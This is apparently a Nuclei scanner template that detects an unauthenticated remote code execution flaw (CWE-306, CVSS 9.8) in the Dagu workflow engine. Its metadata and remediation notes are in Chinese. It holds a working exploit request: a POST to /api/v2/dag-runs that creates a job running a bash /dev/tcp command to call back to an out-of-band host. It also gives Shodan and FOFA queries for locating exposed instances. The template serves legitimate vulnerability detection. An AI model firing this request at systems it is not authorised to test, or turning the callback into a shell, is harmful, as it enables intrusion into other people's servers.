id: dagu-rce

info:
  name: Dagu Workflow Engine - 远程代码执行漏洞
  author: omarkurt
  severity: critical
  description: |
    该模板用于检测 Dagu Workflow Engine - 远程代码执行漏洞。该类漏洞通常源于认证、授权或会话校验逻辑不完整，使未授权用户可访问受保护接口或执行敏感操作。模板会向 `/api/v2/dag-runs` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可绕过登录或权限限制，访问管理功能、敏感数据或业务操作接口。
    - 在管理接口暴露的场景下，可能进一步导致配置被篡改、账号被接管或系统被植入后门。
  remediation: |
    - 在服务端统一执行认证和授权校验，避免仅依赖前端控制或可预测参数。
    - 修复存在绕过问题的版本，并限制管理接口、调试接口和敏感 API 的访问来源。
    - 审计异常登录、权限变更和配置修改记录，轮换可能受影响的账号凭据。
  reference:
    - https://github.com/dagu-org/dagu
    - https://vulnerabletarget.com/vt-dagu
    - https://github.com/advisories/GHSA-6qr9-g2xw-cw92
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306
  metadata:
    verified: true
    max-request: 1
    vendor: dagu-org
    product: dagu
    shodan-query: 'title:"Dagu"'
    fofa-query: 'title="Dagu"'
  tags: dagu,rce,oob,unauth,vuln

variables:
  dag_name: "{{rand_text_alphanumeric(8)}}"

http:
  - raw:
      - |
        POST /api/v2/dag-runs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c 'echo vt > /dev/tcp/{{interactsh-url}}/80'\n"}

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "dagRunId")'
          - 'contains(content_type, "application/json")'
          - 'contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")'
          - 'status_code == 200'
        condition: and
